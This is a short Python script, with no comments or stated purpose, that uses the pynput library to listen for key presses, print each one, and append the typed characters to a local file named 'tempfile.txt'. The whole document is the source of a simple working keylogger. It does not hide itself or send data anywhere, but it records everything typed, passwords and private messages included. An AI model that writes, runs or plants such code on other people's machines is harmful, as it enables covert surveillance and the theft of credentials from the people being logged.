from pynput import keyboard

def KeyStroke(key):
    print(str(key))
    with open("tempfile.txt",'a') as object:
        try:
            char=key.char
            object.write(char)
        except:
            print("Unrecognised key")


if __name__=="__main__":
    event = keyboard.Listener(on_press=KeyStroke)
    event.start()
    input()